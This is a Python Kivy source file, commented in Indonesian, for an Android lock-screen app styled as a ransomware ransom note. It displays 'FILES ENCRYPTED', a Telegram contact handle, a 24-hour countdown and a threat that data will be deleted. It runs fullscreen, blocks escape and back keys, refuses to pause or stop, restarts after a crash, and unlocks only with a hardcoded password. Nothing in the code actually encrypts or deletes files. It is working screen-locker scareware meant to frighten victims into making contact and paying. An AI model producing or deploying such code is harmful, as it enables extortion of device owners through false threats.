"""
Android Lock Screen - NON-SKIPPABLE
Password: wan123
Tampilan persis seperti yang diminta
"""

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle
from kivy.utils import get_color_from_hex
import time
import os

class TrueLockScreen(App):
    # Password yang benar
    CORRECT_PASSWORD = "wan123"
    attempts = 0
    
    def build(self):
        # FULLSCREEN TANPA NAVIGATION
        Window.fullscreen = 'auto'
        Window.clearcolor = (0.05, 0, 0, 1)  # Dark red background
        
        # Main container
        layout = BoxLayout(orientation='vertical', 
                          padding=40, 
                          spacing=20,
                          size_hint=(1, 1))
        
        # Background dengan gradient merah
        with layout.canvas.before:
            self.bg_color = Color(0.1, 0, 0, 1)
            self.bg_rect = Rectangle(pos=layout.pos, size=layout.size)
        
        # ========== TAMPILAN PERSIS SEPERTI GAMBAR ==========
        
        # 1. "FILES ENCRYPTED" (Besar, merah)
        files_label = Label(
            text="FILES ENCRYPTED",
            font_size='42sp',
            bold=True,
            color=get_color_from_hex('#ff0000'),
            size_hint=(1, 0.2),
            halign='center'
        )
        files_label.bind(size=files_label.setter('text_size'))
        
        # 2. "Semua data Anda TERKUNCI."
        locked_label = Label(
            text="Semua data Anda TERKUNCI.",
            font_size='24sp',
            color=get_color_from_hex('#ff5555'),
            size_hint=(1, 0.1)
        )
        
        # 3. "Hubungi: Telegram @wann.njhl"
        contact_label = Label(
            text="Hubungi:\nTelegram @wann.njhl",
            font_size='20sp',
            color=get_color_from_hex('#ff8888'),
            size_hint=(1, 0.15),
            halign='center'
        )
        contact_label.bind(size=contact_label.setter('text_size'))
        
        # 4. Timer "23:59:58"
        self.timer_label = Label(
            text="23:59:58",
            font_size='48sp',
            bold=True,
            color=get_color_from_hex('#ff0000'),
            size_hint=(1, 0.2)
        )
        
        # 5. "Unlock password" label
        unlock_label = Label(
            text="Unlock password",
            font_size='20sp',
            color=get_color_from_hex('#ffffff'),
            size_hint=(1, 0.08)
        )
        
        # 6. Password input field
        self.password_input = TextInput(
            text='',
            password=True,  # Hide password dengan dots
            font_size='28sp',
            size_hint=(1, 0.12),
            background_color=(0.15, 0.15, 0.15, 1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 0, 0, 1),
            multiline=False,
            padding=[20, 15],
            hint_text='Enter password here',
            hint_text_color=(0.6, 0.6, 0.6, 1),
            write_tab=False,
            focus=True
        )
        
        # 7. "UNLOCK" button (Merah besar)
        unlock_button = Button(
            text="UNLOCK",
            font_size='26sp',
            bold=True,
            size_hint=(1, 0.12),
            background_color=get_color_from_hex('#ff0000'),
            background_normal='',  # Remove default button style
            color=(1, 1, 1, 1)
        )
        unlock_button.bind(on_press=self.check_password)
        
        # 8. Error message (kosong awalnya)
        self.error_label = Label(
            text="",
            font_size='18sp',
            color=get_color_from_hex('#ff4444'),
            size_hint=(1, 0.08)
        )
        
        # Tambahkan semua widget ke layout
        widgets = [
            files_label,
            locked_label, 
            contact_label,
            self.timer_label,
            unlock_label,
            self.password_input,
            unlock_button,
            self.error_label
        ]
        
        for widget in widgets:
            layout.add_widget(widget)
        
        # Mulai countdown timer
        self.seconds_left = 23 * 3600 + 59 * 60 + 58  # 23:59:58
        Clock.schedule_interval(self.update_timer, 1)
        
        # Blokir tombol back/home
        self._block_system_keys()
        
        # Auto focus ke input
        Clock.schedule_once(self.focus_input, 0.5)
        
        return layout
    
    def _block_system_keys(self):
        """Block semua tombol system"""
        from kivy.base import EventLoop
        EventLoop.ensure_window()
        
        def on_keyboard(window, key, scancode, codepoint, modifiers):
            # Block: ESC (27), Back (127), Home, etc
            if key in [27, 127, 278, 279]:  # ESC, Backspace, F1, F2
                return True  # Block key
            return False
        
        Window.bind(on_keyboard=on_keyboard)
    
    def focus_input(self, dt):
        """Auto focus ke password input"""
        self.password_input.focus = True
    
    def update_timer(self, dt):
        """Update countdown setiap detik"""
        if self.seconds_left > 0:
            self.seconds_left -= 1
            
            # Format HH:MM:SS
            hours = self.seconds_left // 3600
            minutes = (self.seconds_left % 3600) // 60
            seconds = self.seconds_left % 60
            
            self.timer_label.text = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            # Berkedip merah saat waktu hampir habis
            if self.seconds_left < 300:  # Kurang dari 5 menit
                if int(time.time()) % 2 == 0:
                    self.timer_label.color = get_color_from_hex('#ff0000')
                else:
                    self.timer_label.color = get_color_from_hex('#ff5555')
        else:
            # Waktu habis
            self.timer_label.text = "00:00:00"
            self.timer_label.color = get_color_from_hex('#ff0000')
            self.error_label.text = "TIME EXPIRED! Data will be deleted!"
            Clock.unschedule(self.update_timer)
    
    def check_password(self, instance):
        """Cek apakah password benar"""
        entered = self.password_input.text.strip()
        
        if entered == self.CORRECT_PASSWORD:
            # PASSWORD BENAR - KELUAR APLIKASI
            self.correct_password_sequence()
        else:
            # PASSWORD SALAH
            self.wrong_password_sequence()
    
    def wrong_password_sequence(self):
        """Handle wrong password"""
        self.attempts += 1
        
        # Update error message
        self.error_label.text = f"❌ Wrong password! Attempt: {self.attempts}"
        
        # Clear input
        self.password_input.text = ""
        
        # Red background effect
        self.password_input.background_color = (0.3, 0.1, 0.1, 1)
        
        # Shake animation
        self.shake_input()
        
        # Reset color setelah 0.5 detik
        Clock.schedule_once(self.reset_input_color, 0.5)
        
        # Setelah 5 attempts, tampilkan warning
        if self.attempts >= 5:
            self.error_label.text = "⚠️ Too many failed attempts!"
        
        # Auto focus kembali
        Clock.schedule_once(self.focus_input, 0.1)
    
    def shake_input(self):
        """Animasi goyang saat password salah"""
        original_x = self.password_input.x
        
        def animate_shake(dt, count=0):
            if count < 8:
                offset = 10 if count % 2 == 0 else -10
                self.password_input.x = original_x + offset
                Clock.schedule_once(lambda dt: animate_shake(dt, count + 1), 0.05)
            else:
                self.password_input.x = original_x
        
        animate_shake(None, 0)
    
    def reset_input_color(self, dt):
        """Reset input background color"""
        self.password_input.background_color = (0.15, 0.15, 0.15, 1)
    
    def correct_password_sequence(self):
        """Proses ketika password benar"""
        # Tampilkan success message
        self.error_label.text = ""
        
        # Ganti semua text menjadi hijau/success
        for child in self.root.children:
            if isinstance(child, Label):
                child.color = get_color_from_hex('#00ff00')
        
        # Ubah button menjadi hijau
        for child in self.root.children:
            if isinstance(child, Button):
                child.background_color = get_color_from_hex('#00aa00')
                child.text = "✅ UNLOCKING..."
        
        # Ubah background menjadi hijau
        self.bg_color.rgba = (0, 0.2, 0, 1)
        
        # Countdown 3 detik lalu exit
        self.exit_countdown = 3
        Clock.schedule_interval(self.exit_app_countdown, 1)
    
    def exit_app_countdown(self, dt):
        """Countdown sebelum exit aplikasi"""
        self.exit_countdown -= 1
        
        if self.exit_countdown > 0:
            # Update timer label dengan countdown exit
            self.timer_label.text = f"Exiting in {self.exit_countdown}..."
            self.timer_label.color = get_color_from_hex('#00ff00')
        else:
            # EXIT APLIKASI
            Clock.unschedule(self.exit_app_countdown)
            Clock.unschedule(self.update_timer)
            
            # Force stop app
            import sys
            sys.exit(0)
    
    def on_pause(self):
        """Prevent app from pausing"""
        return True  # Keep running in background
    
    def on_stop(self):
        """Prevent normal stop if still locked"""
        # Cek jika password sudah benar
        if hasattr(self, 'exit_countdown'):
            return True  # Allow stop
        return False  # Prevent stop

# ========== LAUNCH APP ==========
if __name__ == '__main__':
    # Run app dengan error handling
    try:
        TrueLockScreen().run()
    except Exception as e:
        # Jika crash, restart app
        print(f"App restarted: {e}")
        TrueLockScreen().run()
